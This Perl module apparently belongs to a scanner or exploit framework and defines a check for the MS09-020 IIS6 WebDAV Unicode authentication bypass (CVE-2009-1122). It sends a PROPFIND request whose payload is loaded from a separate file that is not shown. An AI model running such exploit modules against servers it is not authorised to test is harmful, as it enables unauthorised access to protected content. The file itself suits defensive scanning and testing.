package MS09::MSF::Ms09_020_webdavUnicodeBypass;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "Ms09_020_webdavUnicodeBypass";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2009-1122",
  DESCRIPTION => "

        This module attempts to to bypass authentication using the WebDAV IIS6

        Unicode vulnerability discovered by Kingcope. The vulnerability appears

        to be exploitable where WebDAV is enabled on the IIS6 server, and any

        protected folder requires either Basic, Digest or NTLM authentication.

      ",
  METHOD => "PROPFIND",
  MSF_MODULE => "ms09_020_webdav_unicode_bypass",
  OSVDB => 54555,
  TITLE => "MS09-020 IIS6 WebDAV Unicode Authentication Bypass",


  TYPE => 'MSF',
  PLATFORM => 'SCANNER',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'PROPFIND',
      PATH   => '',
      PAYLOAD      => read_file('MSFExploits/MS09/MSF/src/Ms09_020_webdavUnicodeBypass.payload', 1),
      TEXT   => 'Sending Exploit #1 Request : [PROPFIND] /',
      HEADERS      => {
        'Content-Type' => 'application/xml',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
